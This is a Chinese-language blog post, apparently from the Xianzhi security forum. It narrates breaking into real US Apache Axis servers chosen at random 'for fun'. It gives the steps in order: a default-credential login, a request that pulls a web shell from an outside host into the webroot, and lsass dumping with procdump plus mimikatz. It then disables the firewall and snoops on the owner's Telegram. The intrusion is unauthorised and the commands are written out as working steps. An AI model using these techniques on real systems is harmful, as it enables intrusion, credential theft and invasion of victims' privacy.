> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9856#toc-0)

> 先知社区，先知安全技术社区

摸鱼
--

日常摸鱼，无聊，想搞几台机器玩一玩，在网上找目标，找老外的机器下手

目标
--

```
country="US" && app="APACHE-Axis"
```

从老洞捡些漏网之鱼，没准还会有意外收获

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714152230-3fdd024a-e474-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152230-3fdd024a-e474-1.png)

目标出现

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714152405-78cd6edc-e474-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152405-78cd6edc-e474-1.png)

还是熟悉的页面，熟悉的端口

然后尝试默认口令登录，ok, 这下稳了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714152611-c39b0fd2-e474-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152611-c39b0fd2-e474-1.png)

先搜集一下信息

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714152642-d5faad2c-e474-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152642-d5faad2c-e474-1.png)

不要上来就部署包，先看一下现有的服务，像这种弱口令的基本上 99.9999% 都已经被人搞过了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714152741-f993a5c2-e474-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152741-f993a5c2-e474-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714152750-fed326c0-e474-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714152750-fed326c0-e474-1.png)

再上传包就多此一举了，可以直接利用

找了一圈没发现遗留的马儿

找绝对路径自己上传

```
C:/elocker/webapps/admin/WEB-INF/classes
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714153205-96dbfabe-e475-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714153205-96dbfabe-e475-1.png)

顺手一测，竟然可以出网，也不需要传 shell 了，直接掏出 cs

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714153502-00089858-e476-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714153502-00089858-e476-1.png)

执行命令

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714153550-1c8a1ac4-e476-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714153550-1c8a1ac4-e476-1.png)

看结果失败了

反弹 shell
--------

难道是因为在 url 里执行，导致 powershell 命令没有执行成功吗？

带着这个疑问 反弹 shell 尝试一下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714154439-57dcf456-e477-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714154439-57dcf456-e477-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714154458-639ac7dc-e477-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714154458-639ac7dc-e477-1.png)

结果还是失败，可以确定，应该是有 waf

写入 shell
--------

```
x.x.x.x:8080/services/config/download?url=http://x.x.x.x/dama.txt&path=C:\elocker\webapps\admin\axis2-web\shell.jsp
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714154852-ef1d462c-e477-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714154852-ef1d462c-e477-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714154904-f5c0690a-e477-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714154904-f5c0690a-e477-1.png)

查看一下进程

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714155219-6a1d0d30-e478-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714155219-6a1d0d30-e478-1.png)

通过对比发现某安全卫士

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714155312-8990a0d2-e478-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714155312-8990a0d2-e478-1.png)

绕过杀软
----

通过测试发现，最基本的`net user`也执行不了

摆在面前的路只有 2 条

*   做免杀
*   抓密码

果断选择抓密码，简单有效。

mimikatz 不免杀不可直接用

这里我利用 procdump 把 lsass 进程的内存文件导出本地，再在本地利用 mimikatz 读取密码

上传 procdump64.exe 并下载 lsass.dmp

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714161612-c024ab04-e47b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161612-c024ab04-e47b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714161418-7c3254a0-e47b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161418-7c3254a0-e47b-1.png)

再在本地解析文件

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# 导出为lsass.dump文件
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
# 把lsass.dmp放在mimikatz目录利用
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714161629-ca5812c8-e47b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161629-ca5812c8-e47b-1.png)

得到 hash, 破解密码

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714161655-d9eec1e6-e47b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161655-d9eec1e6-e47b-1.png)

登录服务器
-----

查看防火墙状态

```
Netsh Advfirewall show allprofiles
```

关闭防火墙

```
NetSh Advfirewall set allprofiles state off
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714161836-163a269a-e47c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161836-163a269a-e47c-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714161850-1e4f2a24-e47c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714161850-1e4f2a24-e47c-1.png)

内网 IP，需搭建代理

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714162039-5fb46380-e47c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162039-5fb46380-e47c-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714162053-67e3d18a-e47c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162053-67e3d18a-e47c-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714162104-6eb74cf8-e47c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162104-6eb74cf8-e47c-1.png)

登录云桌面，发现意外惊喜
------------

发现机主运行了 telegram，嘿嘿

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714162152-8adbfeb0-e47c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162152-8adbfeb0-e47c-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714162204-927a1bf2-e47c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162204-927a1bf2-e47c-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210714162215-98ed53aa-e47c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210714162215-98ed53aa-e47c-1.png)